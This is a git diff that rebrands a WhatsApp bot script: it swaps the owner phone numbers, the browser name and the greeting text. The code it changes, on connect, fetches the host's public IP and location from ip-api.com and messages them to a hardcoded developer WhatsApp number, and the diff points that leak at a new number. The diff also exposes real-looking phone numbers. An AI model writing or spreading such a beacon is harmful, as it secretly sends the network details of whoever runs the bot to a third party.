@@ -48,10 +48,10 @@ const runtime = function (seconds) {
   return dDisplay + hDisplay + mDisplay + sDisplay;
 };
 fakenomor = '0@s.whatsapp.net'
-const gcrevoke = ["94771323434-1621430788@g.us"]
+const gcrevoke = ["94771311254-1621430788@g.us"]
 prefix = '#'
 shp = '⬡'
-owner = "94771323434@s.whatsapp.net"
+owner = "94771311254@s.whatsapp.net"
 spc1 = '         '
 spc2 = '\n                           '
 spc3 = '                   '
@@ -64,7 +64,7 @@ const sleep = async (ms) => {
 const starts = async (client = new WAConnection()) => {
   client.logger.level = "warn";
   client.version = [2, 2143, 3];
-  client.browserDescription = ["PW BY ZBOT", "Chrome", "3.0"];
+  client.browserDescription = ["MIYURU", "Chrome", "3.0"];
   console.log(banner.string);
   client.on("qr", () => {
     console.log(
@@ -114,7 +114,7 @@ await client.connect({ timeoutMs: 30 * 1000 });
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("94771323434@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer imash Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/94771323434?text=Hello bro"}}})
+       client.sendMessage("94771311254@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer imash Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/94771323434?text=Hello bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -191,7 +191,7 @@ console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
           "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
       }
       if (anu.action == "add" && mem.includes(client.user.jid)) {
-        client.sendMessage(anu.jid, "ʜᴇʟʟᴏ ɪ ᴀᴍ ᴢ ᴡʜᴀᴛꜱᴀᴘᴘ ʀᴏʙᴏᴛ.ᴍʏ ᴏᴡɴᴇʀ ɪꜱ ɪᴍᴀꜱʜ ɴɪᴅᴜꜱʜᴀ.ᴛʜᴀᴄᴋꜱ ꜰᴏʀ ᴄʜᴏᴏꜱᴇɪɴɢ ᴍᴇ", "conversation");
+        client.sendMessage(anu.jid, "ʜᴇʟʟᴏ ɪ ᴀᴍ ᴢ ᴡʜᴀᴛꜱᴀᴘᴘ ʀᴏʙᴏᴛ.ᴍʏ ᴏᴡɴᴇʀ ɪꜱ miyuru lakshan.ᴛʜᴀᴄᴋꜱ ꜰᴏʀ ᴄʜᴏᴏꜱᴇɪɴɢ ᴍᴇ", "conversation");
       }
 hehe = await getBuffer(pp_user)
 if (anu.action == 'add' && !mem.includes(client.user.jid)) {
